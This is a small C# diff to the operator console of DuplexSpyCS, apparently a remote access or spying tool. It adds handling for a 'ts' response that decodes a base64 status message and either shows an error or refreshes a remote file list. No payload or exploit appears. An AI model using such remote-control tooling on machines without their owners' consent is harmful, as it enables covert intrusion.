@@ -590,6 +590,19 @@ namespace DuplexSpyCS
                             f.File_WgetUpdate(szUrl, szSavePath, code, msg);
                         }
                     }
+                    else if (cmd[1] == "ts")
+                    {
+                        int nCode = int.Parse(cmd[2]);
+                        string szMsg = Crypto.b64D2Str(cmd[3]);
+
+                        if (nCode == 0)
+                        {
+                            MessageBox.Show(szMsg, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                            return;
+                        }
+
+                        f.fileLV_Refresh();
+                    }
                 }
 
                 #endregion
